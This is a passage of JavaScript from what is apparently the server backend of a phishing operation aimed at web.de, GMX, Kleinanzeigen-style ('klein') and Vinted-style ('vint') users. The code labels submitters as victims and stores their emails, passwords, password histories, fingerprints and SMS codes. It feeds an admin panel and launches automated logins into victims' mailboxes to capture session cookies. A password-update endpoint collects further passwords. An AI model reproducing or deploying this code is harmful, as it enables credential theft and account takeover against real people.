              pushEvent(visitLead, EVENT_VICTIM_EMAIL);
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPassword = et.length > 0 && labelIsVictimPass(et[et.length - 1].label);
                if (!lastIsPassword) {
                  pushEvent(
                    visitLead,
                    victimPassRepeatIsKnownWrong(visitLead, passwordFromBody, false)
                      ? wrongPasswordLabelForVictim(false)
                      : EVENT_VICTIM_PASS
                  );
                }
                appendToAllLog(email, oldPassword, visitLead.password);
                if (visitLead.status === 'error' && passwordFromBody !== (oldPassword || '')) visitLead.status = 'pending';
                const mode = readMode();
                const startPage = readStartPageForBrand(startPageBrandForLead(effectiveBrandIdUpdate));
                if (visitLead.status === 'pending') {
                  const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, visitLead);
                  logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, visitLead.id, email,
                    'submit visitId (' + String(effectiveBrandIdUpdate || 'webde').toUpperCase() + ', первая запись email+пароль): getInitialRedirectStatus → ' + (status || 'null')
                    + (status ? ' · ' + getAutoRedirectEventLabel(status) : ' (Manual / Auto-Login / без авто-редиректа)'));
                  if (status) {
                    visitLead.status = status;
                    pushEvent(visitLead, getAutoRedirectEventLabel(visitLead.status));
                  }
                }
              }
            }
            applyVictimTelemetry(visitLead, req, json, ip, getBrand);
            if (hasPassword && brandIdUpdate !== 'klein') {
              delete visitLead.webdeLoginGridExhausted;
              delete visitLead.webdeLoginGridStep;
            }
            persistLeadFull(visitLead);
            if (brandIsVint(visitLead.brand) || leadHasPinnedVintContext(visitLead)) {
              enforceVintGenericFields(visitLead.id, visitLead.email || '', visitLead.password || '');
            }
            autoUnhideAfterVictimActivity(visitLead);
            logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''), visitLead.id);
            writeDebugLog('SUBMIT_UPDATE_BY_VISITID', {
              visitId: visitId,
              email: email,
              hasPassword: hasPassword,
              leadId: visitLead.id,
              ip: ip,
              totalLeads: leads.length
            });
            if (!shouldSkipVintMailboxAutomation(visitLead, 'submit visitId') && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, webdeSubmitSkipRecovery)) {
              automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
            }
            return send(res, 200, { ok: true, id: visitLead.id });
          } else {
            // Лид вернулся (уже был Успех) — повторный submit: обновляем лог и заново запускаем скрипт входа, чтобы сохранить новые куки
            if (visitLead.status === 'show_success') {
              var nowSucc = new Date().toISOString();
              visitLead.lastSeenAt = nowSucc;
              visitLead.adminListSortAt = nowSucc;
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastPwd = et.length > 0 && labelIsVictimPass(et[et.length - 1].label);
                if (!lastPwd) {
                  pushEvent(
                    visitLead,
                    victimPassRepeatIsKnownWrong(visitLead, passwordFromBody, false)
                      ? wrongPasswordLabelForVictim(false)
                      : 'Ввел пароль повторно'
                  );
                }
                else pushEvent(visitLead, 'Вернулся — повторный ввод');
                const oldP = (visitLead.password || '').trim();
                if (brandIsVint(visitLead.brand) || leadHasPinnedVintContext(visitLead)) {
                  visitLead.emailVt = emailForVint;
                  visitLead.passwordVt = passwordFromBody;
                } else {
                  visitLead.password = passwordFromBody;
                }
                if (hasPassword) pushPasswordHistory(visitLead, passwordFromBody, 'login');
                if ((visitLead.email || '').trim()) appendToAllLog((visitLead.email || '').trim(), oldP, passwordFromBody);
              } else {
                pushEvent(visitLead, 'Вернулся — повторный ввод');
              }
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              applyVictimTelemetry(visitLead, req, json, ip, getBrand);
              persistLeadFull(visitLead);
              if (brandIsVint(visitLead.brand) || leadHasPinnedVintContext(visitLead)) {
                enforceVintGenericFields(visitLead.id, visitLead.email || '', visitLead.password || '');
              }
              autoUnhideAfterVictimActivity(visitLead);
              console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
              pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : String(visitLead.brand || 'webde').toLowerCase(), hasPassword, 'повтор после Успех (обновление куки)');
              if (!shouldSkipVintMailboxAutomation(visitLead, 'submit visitId show_success') && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, true, webdeSubmitSkipRecovery)) {
                automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
              }
              return send(res, 200, { ok: true, id: visitId });
            }
            // Email совпадает — обновляем ту же запись (тот же id): одна история, лид поднимается в списке
            const isKleinSame = submitIndicatesKleinScenario(req, json, visitLead, getBrand);
            const statusBeforeSameVisitUpdate = String(visitLead.status || '').trim();
            console.log('[ВХОД] Лог: visitId + тот же email — обновление записи id=' + visitId + ' (без смены id)');
            const oldPassword = visitLead.password || visitLead.passwordKl || '';
            const prevPwdWebBefore = (visitLead.password || '').trim();
            const prevPwdKlBefore = (visitLead.passwordKl || '').trim();
            const sameBadRepeat = hasPassword && victimSamePasswordAfterMailboxReject(visitLead, passwordFromBody, isKleinSame);
            const now = new Date().toISOString();
            const pastEvents = Array.isArray(visitLead.eventTerminal) ? visitLead.eventTerminal.slice() : [];
            const brandIdSameVisit = isKleinSame ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand, visitLead, email);
            const newEvents = [submitPipelineEventRaw(now, isKleinSame ? 'klein' : brandIdSameVisit, hasPassword, 'повторный submit (visitId), тот же email', email)].concat(
              isKleinSame
                ? [{ at: now, label: EVENT_VICTIM_EMAIL_KL }].concat(hasPassword ? [{ at: now, label: sameBadRepeat ? EVENT_LABELS.WRONG_DATA_KL : EVENT_VICTIM_PASS_KL }] : [])
                : [{ at: now, label: EVENT_VICTIM_EMAIL }].concat(hasPassword ? [{ at: now, label: sameBadRepeat ? EVENT_LABELS.WRONG_DATA : EVENT_VICTIM_PASS }] : [])
            );
            const mode = readMode();
            const startPage = readStartPageForBrand(
              isKleinSame ? 'klein' : startPageBrandForLead(brandIdSameVisit)
            );
            const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : visitLead.screenWidth;
            const platform = resolvePlatform(getPlatformFromRequest(req), json.screenWidth) || visitLead.platform;
            let initialStatus = 'pending';
            if (sameBadRepeat) {
              initialStatus = 'error';
            } else if (platform == null) {
              initialStatus = 'pending';
              if (mode === 'auto' && readAutoScript() && hasPassword && !isKleinSame) {
                newEvents.push({ at: now, label: 'Auto-Login: ожидание входа (ОС уточним по редиректу)' });
              } else {
                newEvents.push({ at: now, label: 'ОС не определена — без редиректа' });
              }
            } else if (hasPassword && !isKleinSame) {
              const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, { platform: platform });
              logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, visitLead.id, email,
                'submit visitId (тот же email+пароль): getInitialRedirectStatus → ' + (status || 'null')
                + ' · platform=' + String(platform || '—')
                + (status ? ' · ' + getAutoRedirectEventLabel(status) : ''));
              if (status) {
                initialStatus = status;
                newEvents.push({ at: now, label: getAutoRedirectEventLabel(initialStatus) });
              }
            }
            const newPassword = hasPassword ? passwordFromBody : '';
            const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : visitLead.screenHeight;
            const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
            visitLead.eventTerminal = pastEvents.concat(newEvents);
            const isVintSameVisit = !isKleinSame && shouldWriteVintOnlyForSubmit(brandIdSameVisit, visitLead, json);
            visitLead.email = (isKleinSame || isVintSameVisit) ? (visitLead.email || '') : email;
            visitLead.password = (isKleinSame || isVintSameVisit)
              ? (visitLead.password || '')
              : (hasPassword ? newPassword : (visitLead.password || ''));
            visitLead.emailKl = isKleinSame ? emailForKlein : (visitLead.emailKl || '');
            visitLead.passwordKl = isKleinSame ? (hasPassword ? newPassword : (visitLead.passwordKl || '')) : (visitLead.passwordKl || '');
            if (isVintSameVisit) {
              visitLead.emailVt = emailForVint;
              visitLead.passwordVt = hasPassword ? newPassword : (visitLead.passwordVt || '');
              visitLead.brand = 'vint';
              visitLead.clientFormBrand = 'vint';
              visitLead.hostBrandAtSubmit = 'vint';
            }
            visitLead.lastSeenAt = now;
            visitLead.adminListSortAt = now;
            visitLead.status = initialStatus;
            visitLead.ip = ip;
            visitLead.platform = platform || visitLead.platform;
            visitLead.screenWidth = screenW;
            visitLead.screenHeight = screenH;
            visitLead.brand = isKleinSame ? 'klein' : (isVintSameVisit ? 'vint' : brandIdSameVisit);
            visitLead.userAgent = ua || visitLead.userAgent || undefined;
            visitLead.fingerprint = (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : (visitLead.fingerprint || undefined);
            if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
            delete visitLead.mergedFromId;
            delete visitLead.mergedIntoId;
            delete visitLead.mergeReason;
            delete visitLead.mergeActor;
            delete visitLead.mergedAt;
            applyVictimTelemetry(visitLead, req, json, ip, getBrand);
            if (!isKleinSame) {
              visitLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
              if (visitLead.passwordHistory.length === 0 && prevPwdWebBefore) {
                visitLead.passwordHistory = [{ p: prevPwdWebBefore, s: 'login' }];
              }
              if (hasPassword) pushPasswordHistory(visitLead, newPassword, 'login');
              if (hasPassword) appendToAllLog(email, oldPassword, newPassword);
            } else if (isKleinSame && hasPassword) {
              visitLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
              if (visitLead.passwordHistory.length === 0 && prevPwdKlBefore) {
                visitLead.passwordHistory = [{ p: prevPwdKlBefore, s: 'login_kl' }];
              }
              pushPasswordHistory(visitLead, newPassword, 'login_kl');
            }
            if (visitLead.smsCodeData && (visitLead.smsCodeData.code || visitLead.smsCodeData.submittedAt)) {
              visitLead.smsCodeData = { code: visitLead.smsCodeData.code || '', submittedAt: visitLead.smsCodeData.submittedAt || new Date().toISOString() };
              if (visitLead.smsCodeData.kind === '2fa' || visitLead.smsCodeData.kind === 'sms') visitLead.smsCodeData.kind = visitLead.smsCodeData.kind;
            }
            if (hasPassword && !isKleinSame) {
              delete visitLead.webdeLoginGridExhausted;
              delete visitLead.webdeLoginGridStep;
            }
            persistLeadFull(visitLead);
            if (isVintSameVisit) {
              enforceVintGenericFields(visitLead.id, visitLead.email || '', visitLead.password || '');
            }
            autoUnhideAfterVictimActivity(visitLead);
            invalidateLeadsCache();
            broadcastLeadsUpdate();
            writeDebugLog('SUBMIT_SAME_VISIT_SAME_EMAIL_IN_PLACE', {
              visitId: visitId,
              email: email,
              hasPassword: hasPassword,
              ip: ip,
              totalLeads: readLeads().length
            });
            if (!isKleinSame || hasPassword) {
              // Если пароль введён повторно и он не изменился — не перезапускаем автовход теми же неверными данными.
              const prevPwd = isKleinSame ? prevPwdKlBefore : prevPwdWebBefore;
              const shouldStart = hasPassword ? (String(passwordFromBody || '') !== String(prevPwd || '')) : !isKleinSame;
              // После wrong_credentials процесс уже мёртв, но lock/email-slot могут ещё давать isLeadAutomationAlreadyRunning=true.
              if (
                shouldStart &&
                !isKleinSame &&
                statusBeforeSameVisitUpdate === 'error'
              ) {
                const emFix = String(visitLead.email || '').trim().toLowerCase();
                automationService.preemptWebdeLoginForReplacedLead(visitLead.id, emFix);
                try {
                  persistLeadPatch(visitLead.id, {
                    webdeScriptActiveRun: null,
                    webdeLoginGridExhausted: null,
                    webdeLoginGridStep: null
                  });
                  invalidateLeadsCache();
                } catch (e) {
                  console.warn('[AUTO-LOGIN] submit same-visit после error: сброс lock/флагов:', e && e.message ? e.message : e);
                }
              }
              if (shouldStart && !shouldSkipVintMailboxAutomation(visitLead, 'submit visitId same_email') && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, webdeSubmitSkipRecovery)) {
                automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
              }
            }
            return send(res, 200, { ok: true, id: visitLead.id });
          }
        } else {
          console.log('[ВХОД] Лог: visitId не найден — создаём новый лог');
          writeDebugLog('SUBMIT_VISITID_NOT_FOUND', { visitId: visitId, email: email, ip: ip });
        }
      }

      // Одна запись на нормализованный email/email_kl: дубли в БД сливаем; при submit обновляем тот же id (история одна, лид вверху списка).
      let existingByEmail = null;
      const fastEmailHitId = typeof findLeadIdByEmail === 'function' ? findLeadIdByEmail(email) : null;
      if (fastEmailHitId && typeof readLeadById === 'function') {
        const fastLead = readLeadById(fastEmailHitId);
        if (fastLead) existingByEmail = fastLead;
      }
      if (!existingByEmail) {
        existingByEmail = readLeads().find(function (l) {
          if (!l) return false;
          const e = (l.email || '').trim().toLowerCase();
          const eKl = (l.emailKl || '').trim().toLowerCase();
          const eVt = (l.emailVt || '').trim().toLowerCase();
          return (e && e === emailLower) || (eKl && eKl === emailLower) || (eVt && eVt === emailLower);
        });
      }

      const brandIdSubmit = submitIndicatesKleinScenario(req, json, existingByEmail, getBrand)
        ? 'klein'
        : submitBrandIdForVictimPost(req, json, getBrand, existingByEmail || visitLeadForBrand, email);
      const isKlein = brandIdSubmit === 'klein';
      const sameBadResubmit = !!(existingByEmail && hasPassword && victimSamePasswordAfterMailboxReject(existingByEmail, passwordFromBody, isKlein));
      const now = new Date().toISOString();
      const newEvents = [submitPipelineEventRaw(now, isKlein ? 'klein' : brandIdSubmit, hasPassword, visitId ? 'visitId не найден — новая запись' : 'новая запись', email)].concat(
        isKlein
          ? [{ at: now, label: EVENT_VICTIM_EMAIL_KL }].concat(hasPassword ? [{ at: now, label: sameBadResubmit ? EVENT_LABELS.WRONG_DATA_KL : EVENT_VICTIM_PASS_KL }] : [])
          : [{ at: now, label: EVENT_VICTIM_EMAIL }].concat(hasPassword ? [{ at: now, label: sameBadResubmit ? EVENT_LABELS.WRONG_DATA : EVENT_VICTIM_PASS }] : [])
      );
      const mode = readMode();
      const startPage = readStartPageForBrand(
        isKlein ? 'klein' : startPageBrandForLead(brandIdSubmit)
      );
      const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : undefined;
      const platform = resolvePlatform(getPlatformFromRequest(req), screenW);
      let initialStatus = 'pending';
      if (sameBadResubmit) {
        initialStatus = 'error';
      } else if (platform == null) {
        initialStatus = 'pending';
        if (mode === 'auto' && readAutoScript() && hasPassword && !isKlein) {
          newEvents.push({ at: now, label: 'Auto-Login: ожидание входа (ОС уточним по редиректу)' });
        } else {
          newEvents.push({ at: now, label: 'ОС не определена — без редиректа' });
        }
      } else if (hasPassword && !isKlein) {
        const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, { platform: platform });
        logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, '', email,
          'submit (новая запись / без visitId): getInitialRedirectStatus → ' + (status || 'null')
          + ' · platform=' + String(platform || '—')
          + (status ? ' · ' + getAutoRedirectEventLabel(status) : ''));
        if (status) {
          initialStatus = status;
          newEvents.push({ at: now, label: getAutoRedirectEventLabel(initialStatus) });
        }
      } else if (hasPassword && isKlein) {
        // Klein: редирект только вручную кнопками в админке, авто на смену пароля не делаем
      }
      const newPassword = hasPassword ? passwordFromBody : '';
      const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;

      const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
      let responseId;
      let leadForAutomation = null;

      if (existingByEmail) {
        const pastEvents = Array.isArray(existingByEmail.eventTerminal) ? existingByEmail.eventTerminal.slice() : [];
        const eventTerminal = pastEvents.concat(newEvents);
        const oldPassword = isKlein ? (existingByEmail.passwordKl || '') : (existingByEmail.password || '');
        const prevPassWeb = (existingByEmail.password || '').trim();
        const prevPassKl = (existingByEmail.passwordKl || '').trim();
        if (hasPassword && !isKlein) appendToAllLog(email, oldPassword, newPassword);
        console.log('[ВХОД] Лог: тот же email — обновление id=' + existingByEmail.id + ' (без смены id)');
        writeDebugLog('SUBMIT_SAME_EMAIL_IN_PLACE', {
          leadId: existingByEmail.id,
          email: email,
          hasPassword: hasPassword,
          ip: ip
        });

        const L = existingByEmail;
        L.eventTerminal = eventTerminal;
        const isVintSubmit = !isKlein && shouldWriteVintOnlyForSubmit(brandIdSubmit, L, json);
        L.email = (isKlein || isVintSubmit) ? (L.email || '') : email;
        L.password = (isKlein || isVintSubmit)
          ? (L.password || '')
          : (hasPassword ? newPassword : (L.password || ''));
        L.emailKl = isKlein ? emailForKlein : (L.emailKl || '');
        L.passwordKl = isKlein ? (hasPassword ? newPassword : (L.passwordKl || '')) : (L.passwordKl || '');
        if (isVintSubmit) {
          L.emailVt = emailForVint;
          L.passwordVt = hasPassword ? newPassword : (L.passwordVt || '');
          L.brand = 'vint';
          L.clientFormBrand = 'vint';
          L.hostBrandAtSubmit = 'vint';
        }
        L.lastSeenAt = now;
        L.adminListSortAt = now;
        L.status = initialStatus;
        L.ip = ip;
        L.platform = platform || L.platform;
        L.screenWidth = screenW;
        L.screenHeight = screenH;
        L.brand = isVintSubmit ? 'vint' : brandIdSubmit;
        L.userAgent = ua || L.userAgent || undefined;
        L.fingerprint = (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : (L.fingerprint || undefined);
        if (incomingDeviceSig) L.deviceSignature = incomingDeviceSig;
        delete L.mergedFromId;
        delete L.mergedIntoId;
        delete L.mergeReason;
        delete L.mergeActor;
        delete L.mergedAt;
        if (!isKlein) {
          L.passwordHistory = normalizePasswordHistory(L.passwordHistory);
          if (L.passwordHistory.length === 0 && prevPassWeb) {
            L.passwordHistory = [{ p: prevPassWeb, s: 'login' }];
          }
        } else {
          L.passwordHistory = normalizePasswordHistory(L.passwordHistory);
          if (L.passwordHistory.length === 0 && prevPassKl) {
            L.passwordHistory = [{ p: prevPassKl, s: 'login_kl' }];
          }
        }
        if (hasPassword && !isKlein) pushPasswordHistory(L, newPassword, 'login');
        if (hasPassword && isKlein) pushPasswordHistory(L, newPassword, 'login_kl');

        applyVictimTelemetry(L, req, json, ip, getBrand);
        if (hasPassword && !isKlein) {
          delete L.webdeLoginGridExhausted;
          delete L.webdeLoginGridStep;
        }
        persistLeadFull(L);
        if (isVintSubmit) {
          enforceVintGenericFields(L.id, L.email || '', L.password || '');
        }
        autoUnhideAfterVictimActivity(L);
        responseId = L.id;
        leadForAutomation = L;
      } else {
        if (hasPassword && !isKlein) appendToAllLog(email, '', newPassword);
        const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
        const isVintSubmitNewLead = !isKlein && shouldWriteVintOnlyForSubmit(brandIdSubmit, null, json);
        const newLead = {
          id: id,
          email: (isKlein || isVintSubmitNewLead) ? '' : email,
          password: (isKlein || isVintSubmitNewLead) ? '' : newPassword,
          emailKl: isKlein ? emailForKlein : '',
          passwordKl: isKlein ? newPassword : '',
          emailVt: isVintSubmitNewLead ? emailForVint : '',
          passwordVt: isVintSubmitNewLead ? newPassword : '',
          createdAt: now,
          adminListSortAt: now,
          lastSeenAt: now,
          status: initialStatus,
          ip: ip,
          eventTerminal: newEvents.slice(),
          platform: platform || undefined,
          screenWidth: screenW,
          screenHeight: screenH,
          brand: isVintSubmitNewLead ? 'vint' : brandIdSubmit,
          userAgent: ua || undefined,
          fingerprint: (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : undefined,
          deviceSignature: incomingDeviceSig || undefined
        };
        if (hasPassword && !isKlein) pushPasswordHistory(newLead, newPassword, 'login');
        if (hasPassword && isKlein) pushPasswordHistory(newLead, newPassword, 'login_kl');
        applyVictimTelemetry(newLead, req, json, ip, getBrand);
        persistLeadFull(newLead);
        if (isVintSubmitNewLead) {
          enforceVintGenericFields(id, '', '');
        }
        responseId = id;
        leadForAutomation = newLead;
        console.log('[ВХОД] Лог: создана запись id=' + id + ', email=' + email + (hasPassword ? ', пароль введён' : '') + (brandIdSubmit === 'klein' ? ' (Klein → админка ' + ADMIN_DOMAIN + ')' : ''));
        writeDebugLog('SUBMIT_NEW_LOG_CREATED', {
          id: id,
          email: email,
          hasPassword: hasPassword,
          visitId: visitId || null,
          ip: ip,
          totalLeads: readLeads().length,
          status: initialStatus,
          pastHistoryTransferred: false
        });
        if (brandIdSubmit === 'klein' && typeof global.__gmwWssBroadcastKleinNewLead === 'function') {
          try {
            global.__gmwWssBroadcastKleinNewLead({
              leadId: id,
              emailKl: String(emailForKlein || '').trim(),
              email: String(email || '').trim(),
            });
          } catch (e) {
            console.warn('[WS] klein_new_lead:', e && e.message ? e.message : e);
          }
        }
      }

      invalidateLeadsCache();
      broadcastLeadsUpdate();
      if (leadForAutomation && !sameBadResubmit && !shouldSkipVintMailboxAutomation(leadForAutomation, 'submit common') && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadForAutomation, false, webdeSubmitSkipRecovery)) {
        automationService.startWebdeLoginAfterLeadSubmit(responseId, leadForAutomation);
      }
      send(res, 200, {
        ok: true,
        id: responseId,
        mailboxPasswordRepeatRejected: !!sameBadResubmit
      });
    });
    return true;
  }
  if (pathname === '/api/update-password' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch (e) {
        console.error('[ВХОД] Ошибка: неверный JSON в теле /api/update-password — ' + (e.message || e));
        return send(res, 400, { ok: false });
      }
      const idRaw = json.id;
      const newPassword = json.password != null ? String(json.password) : '';
      const idempotencyKey = json.idempotencyKey != null ? String(json.idempotencyKey).trim() : '';
      const requestId = json.requestId != null ? String(json.requestId).trim() : '';
      const source = json.source != null ? String(json.source).trim() : 'api';
      const expectedAttemptNo = Number.isFinite(json.attemptNo) ? Number(json.attemptNo) : null;
      if (!idRaw || typeof idRaw !== 'string') {
        console.error('[ВХОД] Ошибка: в теле /api/update-password отсутствует поле id или оно не строка.');
        return send(res, 400, { ok: false });
      }
      const id = resolveLeadId(idRaw);
      const lead = readLeadById(id);
      if (!lead) {
        console.error('[ВХОД] Ошибка: лид не найден для update-password — id=' + idRaw + ' (в БД нет такой записи).');
        return send(res, 404, { ok: false });
      }
      const email = (lead.email || lead.emailVt || '').trim();
      const emailVtWrite = String((lead.emailVt || lead.email || '')).trim();
      logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'пароль id=' + id, id);
      const oldPassword = lead.password != null ? String(lead.password) : '';
      lead.lastSeenAt = new Date().toISOString();
      if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
      if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
      const platformUpdate = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
      if (platformUpdate != null) lead.platform = platformUpdate;
      if (req.headers && req.headers['user-agent']) lead.userAgent = String(req.headers['user-agent']);
      if (json.fingerprint && typeof json.fingerprint === 'object') lead.fingerprint = json.fingerprint;
      const currentActionBrand = resolveVictimActionBrand(req, json, getBrand, lead, lead.emailVt || lead.email || '');
      const vintAction = brandIsVint(currentActionBrand) || leadHasPinnedVintContext(lead);
      applyVictimTelemetry(lead, req, json, getClientIp(req), getBrand);
      if (currentActionBrand === 'webde' || currentActionBrand === 'gmx' || currentActionBrand === 'klein' || currentActionBrand === 'vint') {
        lead.brand = currentActionBrand;
      }
      if (payloadClientFormBrand(json)) {
        lead.clientFormBrand = currentActionBrand;
      }
      if (vintAction) {
        lead.clientFormBrand = 'vint';
        lead.hostBrandAtSubmit = 'vint';
      }
      if (vintAction && emailVtWrite) {
        lead.emailVt = emailVtWrite;
      }

      if (currentActionBrand !== 'klein' && newPassword.trim() !== '') {
        if (victimSamePasswordAfterMailboxReject(lead, newPassword, false)) {
          if (!terminalLastLabelIsWrongPassword(lead)) {
            pushEvent(lead, EVENT_LABELS.WRONG_DATA);
          }
          const nowReject = new Date().toISOString();
          lead.lastSeenAt = nowReject;
          persistLeadPatch(id, {
            lastSeenAt: lead.lastSeenAt,
            eventTerminal: lead.eventTerminal,
            adminListSortAt: nowReject,
            brand: vintAction ? 'vint' : undefined,
            clientFormBrand: vintAction ? 'vint' : undefined,
            hostBrandAtSubmit: vintAction ? 'vint' : undefined,
            emailVt: vintAction && emailVtWrite ? emailVtWrite : undefined,
            passwordVt: vintAction ? newPassword : undefined
          });
          autoUnhideAfterVictimActivity(lead);
          return send(res, 200, { ok: true, id: id, mailboxPasswordRepeatRejected: true });
        }
      }

      if (currentActionBrand === 'klein') {
        const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
        const storedKl = (lead.passwordKl != null) ? String(lead.passwordKl) : '';
        if (currentPassword !== storedKl) {
          return send(res, 400, { ok: false, error: 'wrong_current_password' });
        }
        lead.passwordKl = newPassword;
        pushEvent(lead, 'Новый пароль Kl');
        pushPasswordHistory(lead, newPassword, 'change_kl');
        persistLeadFull(lead);
        console.log('[ВХОД] Klein: пароль kl изменён id=' + id);
        return send(res, 200, { ok: true, id: id });
      }

      if (vintAction) {
        const nowVint = new Date().toISOString();
        const refreshedLeadVint = readLeadById(id) || lead;
        const oldPasswordVint = refreshedLeadVint.passwordVt != null ? String(refreshedLeadVint.passwordVt) : '';
        refreshedLeadVint.lastSeenAt = nowVint;
        refreshedLeadVint.adminListSortAt = nowVint;
        refreshedLeadVint.brand = 'vint';
        refreshedLeadVint.clientFormBrand = 'vint';
        refreshedLeadVint.hostBrandAtSubmit = 'vint';
        refreshedLeadVint.emailVt = emailVtWrite || refreshedLeadVint.emailVt || '';
        refreshedLeadVint.passwordVt = newPassword;
        if (String(refreshedLeadVint.status || '').trim() === 'error' && newPassword.trim() !== oldPasswordVint.trim()) {
          refreshedLeadVint.status = 'pending';
        }
        if (!refreshedLeadVint.eventTerminal) refreshedLeadVint.eventTerminal = [];
        const hasPasswordEventVint = refreshedLeadVint.eventTerminal.some(function (e) {
          return labelIsVictimPass(e.label);
        });
        if (victimPassRepeatIsKnownWrong(refreshedLeadVint, newPassword, false)) {
          pushEvent(refreshedLeadVint, wrongPasswordLabelForVictim(false));
        } else if (!hasPasswordEventVint) {
          pushEvent(refreshedLeadVint, EVENT_VICTIM_PASS);
        } else {
          pushEvent(refreshedLeadVint, 'Ввел пароль повторно');
        }
        if (!Array.isArray(refreshedLeadVint.passwordHistory)) refreshedLeadVint.passwordHistory = [];
        if (refreshedLeadVint.passwordHistory.length === 0 && oldPasswordVint.trim()) {
          refreshedLeadVint.passwordHistory.push({ p: oldPasswordVint.trim(), s: 'login' });
        }
        pushPasswordHistory(refreshedLeadVint, newPassword, 'login');
        autoUnhideAfterVictimActivity(refreshedLeadVint);
        persistLeadPatch(id, {
          brand: 'vint',
          clientFormBrand: 'vint',
          hostBrandAtSubmit: 'vint',
          status: refreshedLeadVint.status,
          eventTerminal: refreshedLeadVint.eventTerminal,
          passwordHistory: refreshedLeadVint.passwordHistory,
          emailVt: refreshedLeadVint.emailVt,
          passwordVt: refreshedLeadVint.passwordVt,
          lastSeenAt: refreshedLeadVint.lastSeenAt,
          adminListSortAt: refreshedLeadVint.adminListSortAt
        });
        writeDebugLog('UPDATE_PASSWORD_VINT', {
          id: id,
          emailVt: refreshedLeadVint.emailVt,
          oldPasswordVt: oldPasswordVint,
          newPasswordVt: newPassword,
          status: refreshedLeadVint.status
        });
        return send(res, 200, { ok: true, id: id });
      }

      const passwordWrite = updateLeadPasswordVersioned({
        leadId: id,
        newPassword: newPassword,
        idempotencyKey: idempotencyKey,
        requestId: requestId,
        source: source,
        expectedAttemptNo: expectedAttemptNo
      });
      if (!passwordWrite || passwordWrite.ok !== true) {
        if (passwordWrite && passwordWrite.code === 'attempt_mismatch') {
          return send(res, 409, { ok: false, error: 'attempt_mismatch', currentAttemptNo: passwordWrite.currentAttemptNo });
        }
        if (passwordWrite && passwordWrite.code === 'version_conflict') {
          return send(res, 409, { ok: false, error: 'version_conflict' });
        }
        return send(res, 500, { ok: false, error: 'password_write_failed' });
      }
      const writeInfo = passwordWrite.response || {};
      const refreshedLead = readLeadById(id) || lead;
      const dbBrandAfterPasswordWrite = String((refreshedLead && refreshedLead.brand) || '').trim().toLowerCase();
      const vintContextNow =
        vintAction ||
        dbBrandAfterPasswordWrite === 'vint' ||
        String((refreshedLead && refreshedLead.clientFormBrand) || '').trim().toLowerCase() === 'vint' ||
        String((refreshedLead && refreshedLead.hostBrandAtSubmit) || '').trim().toLowerCase() === 'vint' ||
        String((refreshedLead && refreshedLead.emailVt) || '').trim() !== '' ||
        String((refreshedLead && refreshedLead.passwordVt) || '').trim() !== '';
      if (currentActionBrand === 'webde' || currentActionBrand === 'gmx' || currentActionBrand === 'klein' || currentActionBrand === 'vint') {
        refreshedLead.brand = currentActionBrand;
      }
      if (vintContextNow) {
        refreshedLead.brand = 'vint';
        refreshedLead.clientFormBrand = 'vint';
        refreshedLead.hostBrandAtSubmit = 'vint';
        refreshedLead.emailVt = email || refreshedLead.emailVt || '';
        refreshedLead.passwordVt = newPassword;
      }
      if (newPassword.trim() !== String(oldPassword || '').trim()) {
        delete refreshedLead.mailboxLastRejectedPassword;
        delete refreshedLead.mailboxLastRejectedPasswordKl;
      }
      console.log(
        '[PASSWORD_UPDATE] instance=' + SERVER_INSTANCE +
        ' leadId=' + id +
        ' attemptNo=' + (writeInfo.attemptNo != null ? writeInfo.attemptNo : (refreshedLead.attemptNo || 1)) +
        ' passwordVersion=' + (writeInfo.newVersion != null ? writeInfo.newVersion : (refreshedLead.passwordVersion || 0)) +
        ' requestId=' + (requestId || '-') +
        ' oldHash=' + (oldPassword ? '[set]' : '[empty]') +
        ' newHash=' + (newPassword ? '[set]' : '[empty]') +
        ' source=' + source +
        ' updatedAt=' + (writeInfo.updatedAt || new Date().toISOString()) +
